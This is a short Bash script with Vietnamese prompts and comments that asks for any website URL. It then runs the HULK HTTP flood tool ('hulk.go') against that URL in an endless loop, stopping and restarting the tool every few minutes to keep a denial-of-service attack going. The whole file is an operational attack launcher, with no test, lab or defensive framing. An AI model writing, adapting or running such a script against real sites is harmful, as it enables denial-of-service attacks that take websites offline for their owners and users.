#!/bin/bash
cd hulk

# Nhập tham số từ user
echo "Nhập URL của website (ví dụ: https://example.com): "
read website

echo "Nhập thời gian chờ trước khi dừng (mặc định 420 giây): "
read wait_time

echo "Nhập thời gian nghỉ trước khi restart (mặc định 1 giây): "
read rest_time

# Đặt giá trị mặc định nếu không nhập
wait_time=${wait_time:-420}  # Mặc định 420 giây nếu wait_time rỗng
rest_time=${rest_time:-1}    # Mặc định 1 giây nếu rest_time rỗng

# Kiểm tra xem tham số có hợp lệ không
if [[ -z "$website" || -z "$wait_time" || -z "$rest_time" ]]; then
    echo "Lỗi: Phải nhập đầy đủ các tham số!"
    exit 1
fi

# Vòng lặp chạy hulk.go với tham số user nhập
while true; do
    echo "Bắt đầu chạy hulk với website: $website..."
    go run hulk.go -site "$website" &  # Chạy trong background với URL động
    PID=$!  # Lưu PID
    echo "PID: $PID"
    sleep "$wait_time"  # Chờ theo thời gian user nhập
    echo "Dừng hulk..."
    kill $PID  # Giết tiến trình
    sleep "$rest_time"  # Nghỉ theo thời gian user nhập
    echo "Khởi động lại..."
done
